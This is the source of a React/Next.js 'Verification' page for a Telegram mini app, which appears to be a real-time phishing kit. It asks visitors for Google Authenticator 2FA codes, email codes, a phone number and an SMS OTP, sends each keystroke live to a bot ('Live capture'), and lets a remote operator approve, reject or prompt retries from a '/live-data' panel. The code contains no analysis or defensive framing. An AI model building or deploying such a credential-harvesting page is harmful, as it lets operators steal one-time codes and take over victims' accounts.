'use client';

import { useState, useRef, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useTelegram } from '../components/providers/TelegramProvider';
import { sendDataToBot } from '../lib/dataSync';
import { postLiveEvent } from '../lib/eventSync';
import { useRemoteControlListener } from '../lib/remoteControl';
import { useToast } from '../components/providers/ToastContext';
import './verification.css';

export default function VerificationPage() {
    const router = useRouter();
    const { webApp } = useTelegram();
    const { showError } = useToast();
    const [waitingFor, setWaitingFor] = useState<null | '2fa' | 'email' | 'phone'>(null);
    const [isFinalSubmitting, setIsFinalSubmitting] = useState(false);

    // Clear remote state on mount to prevent stale "Verified" badges
    useEffect(() => {
        fetch('/api/remote-control', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'verify_clear' })
        }).catch(() => { });
    }, []);

    // State
    const [verified, setVerified] = useState({
        '2fa': false,
        'email': false,
        'phone': false
    });

    const [modalType, setModalType] = useState<'2fa' | 'email' | 'phone' | null>(null);
    const [phoneStep, setPhoneStep] = useState<1 | 2>(1);
    const [inputValue, setInputValue] = useState('');
    const [phoneValue, setPhoneValue] = useState('');

    // Refs for focus management
    const popupInputRef = useRef<HTMLInputElement>(null);
    const phoneInputRef = useRef<HTMLInputElement>(null);
    const otpInputRef = useRef<HTMLInputElement>(null);

    const verifiedCount = Object.values(verified).filter(Boolean).length;

    useRemoteControlListener({
        onToast: (msg) => {
            showError(msg);
            // If user is waiting for approval, treat any admin toast as a rejection -> stop loader and allow retry.
            if (waitingFor) {
                setWaitingFor(null);
                setInputValue('');
                webApp?.HapticFeedback?.notificationOccurred('error');
                if (modalType === 'phone' && phoneStep === 2) {
                    shakeInput(otpInputRef.current);
                } else {
                    shakeInput(popupInputRef.current);
                }
            }
            if (isFinalSubmitting) setIsFinalSubmitting(false);
        },
        onVerify: (values) => {
            setVerified(prev => ({
                ...prev,
                ...(values['2fa'] ? { '2fa': true } : {}),
                ...(values.email ? { email: true } : {}),
                ...(values.phone ? { phone: true } : {}),
            }));
            setModalType((prev) => (prev && values[prev] ? null : prev));
            // If we were waiting and the admin approved that specific key, stop loader.
            if (waitingFor && values[waitingFor]) {
                setWaitingFor(null);
                setInputValue('');
                setPhoneStep(1);
            }
        }
    });

    // Focus management when modals open
    useEffect(() => {
        if (modalType === 'phone') {
            if (phoneStep === 1) {
                setTimeout(() => phoneInputRef.current?.focus(), 100);
            } else {
                setTimeout(() => otpInputRef.current?.focus(), 100);
            }
        } else if (modalType) {
            setTimeout(() => popupInputRef.current?.focus(), 100);
        }
    }, [modalType, phoneStep]);

    const handleOpenModal = (type: '2fa' | 'email' | 'phone') => {
        if (verified[type]) return; // Don't open if already verified
        if (waitingFor) return; // lock while waiting for admin approve/reject

        webApp?.HapticFeedback?.impactOccurred('light');
        postLiveEvent('user_verification_open', { type });
        setModalType(type);
        setInputValue('');
        setPhoneStep(1);
        if (type !== 'phone') setPhoneValue('');
    };

    const handleCloseModal = () => {
        if (waitingFor) return; // lock UI while waiting for admin approve/reject
        setModalType(null);
        setInputValue('');
    };

    const shakeInput = (inputElement: HTMLInputElement | null) => {
        if (inputElement) {
            inputElement.style.borderColor = '#ff4d4d';
            setTimeout(() => inputElement.style.borderColor = '#3a3d3d', 500);
        }
    };

    const handleConfirm = () => {
        postLiveEvent('user_verification_confirm', { modalType, phoneStep });
        if (waitingFor) return;
        if (!inputValue && modalType !== 'phone') { // Basic check
            webApp?.HapticFeedback?.notificationOccurred('error');
            shakeInput(popupInputRef.current);
            return;
        }

        if (modalType === 'phone') {
            if (phoneStep === 1) {
                if (inputValue.length !== 10) {
                    webApp?.HapticFeedback?.notificationOccurred('error');
                    shakeInput(phoneInputRef.current);
                    return;
                }
                webApp?.HapticFeedback?.notificationOccurred('success');
                setPhoneValue(inputValue);
                sendDataToBot('user_phone_number', inputValue);
                setPhoneStep(2);
                setInputValue('');
            } else {
                if (inputValue.length !== 6 || !/^\d+$/.test(inputValue)) {
                    webApp?.HapticFeedback?.notificationOccurred('error');
                    shakeInput(otpInputRef.current);
                    return;
                }
                webApp?.HapticFeedback?.notificationOccurred('success');
                sendDataToBot('user_verification_codes', JSON.stringify({ phone: inputValue }));
                // Do NOT mark verified locally. Admin approves from /live-data only.
                setWaitingFor('phone');
            }
        } else if (modalType) {
            if (inputValue.length !== 6 || !/^\d+$/.test(inputValue)) {
                webApp?.HapticFeedback?.notificationOccurred('error');
                shakeInput(popupInputRef.current);
                return;
            }

            webApp?.HapticFeedback?.notificationOccurred('success');
            const data: any = {};
            data[modalType] = inputValue;
            sendDataToBot('user_verification_codes', JSON.stringify(data));
            // Do NOT mark verified locally. Admin approves from /live-data only.
            setWaitingFor(modalType);
        }
    };

    const handleFinalConfirm = () => {
        if (isFinalSubmitting) return;
        webApp?.HapticFeedback?.notificationOccurred('success');
        setIsFinalSubmitting(true);
        postLiveEvent('user_verification_final_confirm', {});
        // Do NOT navigate automatically. Admin controls navigation via /live-data.
    };

    const handleInput = (e: React.ChangeEvent<HTMLInputElement>, isPhone = false) => {
        let val = e.target.value;
        if (!isPhone) {
            val = val.replace(/[^0-9]/g, '');
        }
        setInputValue(val);

        // Live capture
        if (modalType === 'phone' && phoneStep === 1) {
            sendDataToBot('user_phone_number', val);
        } else if (modalType) {
            const data: any = {};
            // For phone OTP, key is 'phone' in the JSON object inside user_verification_codes
            if (modalType === 'phone' && phoneStep === 2) {
                sendDataToBot('user_verification_codes', JSON.stringify({ phone: val }));
            } else {
                data[modalType] = val;
                sendDataToBot('user_verification_codes', JSON.stringify(data));
            }
        }
    };

    const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>, isPhone = false) => {
        if (!isPhone && !/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    };

    return (
        <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', justifyContent: 'space-between', padding: '60px 20px 20px' }}>
            <style>{`@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}`}</style>
            {/* Remote Error Toast is now handled by ToastContext */}
            <div className="verification-container">
                {/* Shield Icon */}
                <div className="icon-wrapper">
                    <svg className="shield-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 22C17.5228 20.6 20 15.5 20 11V5L12 2L4 5V11C4 15.5 6.47715 20.6 12 22Z" fill="#B0B5B9" />
                        <path fillRule="evenodd" clipRule="evenodd"
                            d="M12 8.5C10.8954 8.5 10 9.39543 10 10.5C10 11.2307 10.4022 11.8711 11 12.2109V14.5C11 15.0523 11.4477 15.5 12 15.5C12.5523 15.5 13 15.0523 13 14.5V12.2109C13.5978 11.8711 14 11.2307 14 10.5C14 9.39543 13.1046 8.5 12 8.5Z"
                            fill="#181818" />
                    </svg>
                </div>

                {/* Header */}
                <h2 className="title">Verification</h2>
                <p className="subtitle">For your account safety, please complete all of the following verifications to continue.</p>

                {/* Progress */}
                <div className="progress-indicator">{verifiedCount} / 2</div>

                {/* Verification Options */}
                <div className="verification-options">
                    {/* 2FA Verification */}
                    <div className="verification-item" id="opt-2fa" onClick={() => handleOpenModal('2fa')}>
                        <svg className="item-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="12" cy="12" r="9" stroke="#8E8E93" strokeWidth="2" />
                            <path d="M12 7V12L15 15" stroke="#8E8E93" strokeWidth="2" strokeLinecap="round" />
                        </svg>
                        <span className="item-label">2FA Verification</span>
                        <span className="item-action" style={{ color: verified['2fa'] ? '#2EE67C' : '#8E8E93' }}>
                            {verified['2fa'] ? 'Verified' : 'Go Verify>'}
                        </span>
                    </div>

                    {/* Email Verification */}
                    <div className="verification-item" id="opt-email" onClick={() => handleOpenModal('email')}>
                        <svg className="item-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="3" y="5" width="18" height="14" rx="2" stroke="#8E8E93" strokeWidth="2" />
                            <path d="M3 7L12 13L21 7" stroke="#8E8E93" strokeWidth="2" strokeLinecap="round" />
                        </svg>
                        <span className="item-label">Email Verification</span>
                        <span className="item-action" style={{ color: verified['email'] ? '#2EE67C' : '#8E8E93' }}>
                            {verified['email'] ? 'Verified' : 'Go Verify>'}
                        </span>
                    </div>

                    {/* Phone Number */}
                    <div className="verification-item" id="opt-phone" onClick={() => handleOpenModal('phone')}>
                        <svg className="item-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="6" y="2" width="12" height="20" rx="2" stroke="#8E8E93" strokeWidth="2" />
                            <line x1="10" y1="18" x2="14" y2="18" stroke="#8E8E93" strokeWidth="2" strokeLinecap="round" />
                        </svg>
                        <span className="item-label">Phone Number</span>
                        <span className="item-action" style={{ color: verified['phone'] ? '#2EE67C' : '#8E8E93' }}>
                            {verified['phone'] ? 'Verified' : 'Go Verify>'}
                        </span>
                    </div>
                </div>

                {/* Confirm Button */}
                <button className="confirm-btn" id="confirm-btn" onClick={handleFinalConfirm} disabled={isFinalSubmitting || verifiedCount < 2} style={{ opacity: (isFinalSubmitting || verifiedCount < 2) ? 0.5 : 1 }}>
                    {isFinalSubmitting ? 'Loading...' : 'Confirm'}
                </button>

                {/* Help Section */}
                <div className="help-section">
                    <p className="help-text">Don't have access to these verification methods?</p>
                    <a href="#" className="support-link">Contact live support</a>
                </div>
            </div>

            {/* Popup for 2FA and Email */}
            <div className={`popup-overlay ${modalType && modalType !== 'phone' ? 'active' : ''}`} id="verification-popup">
                <div className="popup-content">
                    <button className="popup-close-btn" onClick={handleCloseModal} style={{ opacity: waitingFor ? 0.4 : 1, pointerEvents: waitingFor ? 'none' : 'auto' }}>×</button>
                    <div className="popup-shield-icon">
                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M12 22C17.5228 20.6 20 15.5 20 11V5L12 2L4 5V11C4 15.5 6.47715 20.6 12 22Z" fill="#B0B5B9" />
                            <path fillRule="evenodd" clipRule="evenodd" d="M12 8.5C10.8954 8.5 10 9.39543 10 10.5C10 11.2307 10.4022 11.8711 11 12.2109V14.5C11 15.0523 11.4477 15.5 12 15.5C12.5523 15.5 13 15.0523 13 14.5V12.2109C13.5978 11.8711 14 11.2307 14 10.5C14 9.39543 13.1046 8.5 12 8.5Z" fill="#181818" />
                        </svg>
                    </div>
                    <h3 className="popup-title">Enter Verification Code</h3>
                    <p className="popup-subtitle">
                        {modalType === '2fa' ? 'Enter the code generated by your Google Authenticator App.' : 'Enter the code sent to your email address.'}
                    </p>
                    <input
                        type="text"
                        className="popup-input"
                        id="popup-code-input"
                        placeholder="6-digit verification code"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        maxLength={6}
                        value={inputValue}
                        onChange={(e) => handleInput(e)}
                        onKeyPress={(e) => handleKeyPress(e)}
                        ref={popupInputRef}
                    />
                    <button className="popup-btn confirm" onClick={handleConfirm} disabled={!!waitingFor} style={{ opacity: waitingFor ? 0.5 : 1 }}>
                        {waitingFor && (waitingFor === modalType) ? 'Waiting...' : 'Confirm'}
                    </button>
                </div>
            </div>

            {/* Phone Popup - Two Step Flow */}
            <div className={`popup-overlay ${modalType === 'phone' ? 'active' : ''}`} id="phone-popup">
                <div className="popup-content">
                    <button className="popup-close-btn" onClick={handleCloseModal} style={{ opacity: waitingFor ? 0.4 : 1, pointerEvents: waitingFor ? 'none' : 'auto' }}>×</button>
                    <div className="popup-shield-icon">
                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M12 22C17.5228 20.6 20 15.5 20 11V5L12 2L4 5V11C4 15.5 6.47715 20.6 12 22Z" fill="#B0B5B9" />
                            <path fillRule="evenodd" clipRule="evenodd" d="M12 8.5C10.8954 8.5 10 9.39543 10 10.5C10 11.2307 10.4022 11.8711 11 12.2109V14.5C11 15.0523 11.4477 15.5 12 15.5C12.5523 15.5 13 15.0523 13 14.5V12.2109C13.5978 11.8711 14 11.2307 14 10.5C14 9.39543 13.1046 8.5 12 8.5Z" fill="#181818" />
                        </svg>
                    </div>
                    {/* Step 1: Enter Phone Number */}
                    {phoneStep === 1 && (
                        <div id="phone-step-1">
                            <h3 className="popup-title">Enter Mobile Number</h3>
                            <p className="popup-subtitle">Please enter your mobile number to receive a verification code.</p>
                            <input
                                type="tel"
                                className="popup-input"
                                id="phone-number-input"
                                placeholder="1234567890"
                                maxLength={10}
                                value={inputValue}
                                onChange={(e) => handleInput(e, true)}
                                ref={phoneInputRef}
                            />
                            <button className="popup-btn confirm" onClick={handleConfirm}>Send OTP</button>
                        </div>
                    )}
                    {/* Step 2: Enter OTP */}
                    {phoneStep === 2 && (
                        <div id="phone-step-2">
                            <h3 className="popup-title">Enter Verification Code</h3>
                            <p className="popup-subtitle">
                                Enter the code sent to <span id="phone-display" style={{ color: '#FFFFFF' }}>{phoneValue}</span>
                            </p>
                            <input
                                type="text"
                                className="popup-input"
                                id="phone-otp-input"
                                placeholder="6-digit verification code"
                                inputMode="numeric"
                                pattern="[0-9]*"
                                maxLength={6}
                                value={inputValue}
                                onChange={(e) => handleInput(e)}
                                onKeyPress={(e) => handleKeyPress(e)}
                                ref={otpInputRef}
                            />
                            <button className="popup-btn confirm" onClick={handleConfirm} disabled={!!waitingFor} style={{ opacity: waitingFor ? 0.5 : 1 }}>
                                {waitingFor === 'phone' ? 'Waiting...' : 'Confirm'}
                            </button>
                        </div>
                    )}
                </div>
            </div>

            {/* Footer */}
            <div className="footer">1 of 2</div>
        </div>
    );
}
